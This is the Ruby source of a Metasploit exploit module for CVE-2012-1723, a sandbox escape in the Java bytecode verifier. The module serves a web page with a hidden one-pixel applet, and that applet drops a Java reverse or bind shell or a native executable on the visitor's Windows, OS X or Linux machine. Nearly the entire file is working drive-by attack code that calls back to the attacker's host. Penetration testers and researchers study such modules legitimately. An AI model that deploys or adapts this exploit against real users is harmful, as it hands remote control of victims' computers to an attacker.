# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )
    super( update_info( info,
      &#039;Name&#039;           => &#039;Java Applet Field Bytecode Verifier Cache Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in HotSpot bytecode verifier where an invalid
        optimisation of GETFIELD/PUTFIELD/GETSTATIC/PUTSTATIC instructions leads to insufficent
        type checks. This allows a way to escape the JRE sandbox, and load additional classes
        in order to perform malicious operations.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Stefan Cornellius&#039;,     # Discoverer
          &#039;mihi&#039;,                  # Vuln analysis
          &#039;littlelightlittlefire&#039;, # metasploit module
          &#039;juan vazquez&#039;,          # merged code (overlapped)
          &#039;sinn3r&#039;                 # merged code (overlapped)
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2012-1723&#039;],
          [&#039;OSVDB&#039;, &#039;82877&#039;],
          [&#039;BID&#039;, &#039;52161&#039;],
          [&#039;URL&#039;, &#039;http://schierlm.users.sourceforge.net/CVE-2012-1723.html&#039;],
          [&#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/javacpujun2012-1515912.html&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=829373&#039;],
          [&#039;URL&#039;, &#039;http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/253e7c32def9&#039;],
          [&#039;URL&#039;, &#039;http://icedtea.classpath.org/hg/release/icedtea7-forest-2.1/hotspot/rev/8f86ad60699b&#039;]
        ],
      &#039;Platform&#039;       => [ &#039;java&#039;, &#039;win&#039;, &#039;osx&#039;, &#039;linux&#039;, &#039;solaris&#039; ],
      &#039;Payload&#039;        => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (Java Payload)&#039;,
            {
              &#039;Platform&#039; => [&#039;java&#039;],
              &#039;Arch&#039; => ARCH_JAVA
            }
          ],
          [ &#039;Windows x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Arch&#039; => ARCH_X86
            }
          ],
          [ &#039;Mac OS X PPC (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;osx&#039;,
              &#039;Arch&#039; => ARCH_PPC
            }
          ],
          [ &#039;Mac OS X x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;osx&#039;,
              &#039;Arch&#039; => ARCH_X86
            }
          ],
          [ &#039;Linux x86 (Native Payload)&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X86
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 06 2012&#039;
    ))
  end


  def exploit
    # load the static jar file
    path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-1723.jar" )
    fd = File.open( path, "rb" )
    @jar_data = fd.read(fd.stat.size)
    fd.close

    super
  end


  def on_request_uri( cli, request )
    data = ""
    host = ""
    port = ""

    if not request.uri.match(/\.jar$/i)
      if not request.uri.match(/\/$/)
        send_redirect( cli, get_resource() + &#039;/&#039;, &#039;&#039;)
        return
      end

      print_status("Sending #{self.name}")

      payload = regenerate_payload( cli )
      if not payload
        print_error("Failed to generate the payload." )
        return
      end

      if target.name == &#039;Generic (Java Payload)&#039;
        if datastore[&#039;LHOST&#039;]
          jar  = payload.encoded
          host = datastore[&#039;LHOST&#039;]
          port = datastore[&#039;LPORT&#039;]
          vprint_status("Sending java reverse shell")
        else
          port = datastore[&#039;LPORT&#039;]
          datastore[&#039;RHOST&#039;] = cli.peerhost
          vprint_status( "Java bind shell" )
        end
        if jar
          print_status( "Generated jar to drop (#{jar.length} bytes)." )
        else
          print_error("Failed to generate the executable." )
          return
        end
      else

        # NOTE: The EXE mixin automagically handles detection of arch/platform
        data = generate_payload_exe

        if data
          print_status("Generated executable to drop (#{data.length} bytes)." )
        else
          print_error("Failed to generate the executable." )
          return
        end

      end

      send_response_html( cli, generate_html( data, jar, host, port ), { &#039;Content-Type&#039; => &#039;text/html&#039; } )
      return
    end

    print_status("Sending jar")
    send_response( cli, generate_jar(), { &#039;Content-Type&#039; => "application/octet-stream" } )

    handler( cli )
  end

  def generate_html( data, jar, host, port )
    jar_name = rand_text_alpha(rand(6)+3) + ".jar"

    html  = "<html><head></head>"
    html += "<body>"
    html += "<applet archive=\"#{jar_name}\" code=\"cve1723.Attacker\" width=\"1\" height=\"1\">"
    html += "<param name=\"data\" value=\"#{data}\"/>" if data
    html += "<param name=\"jar\" value=\"#{jar}\"/>" if jar
    html += "<param name=\"lhost\" value=\"#{host}\"/>" if host
    html += "</applet></body></html>"
    return html
  end

  def generate_jar()
    @jar_data
  end

end



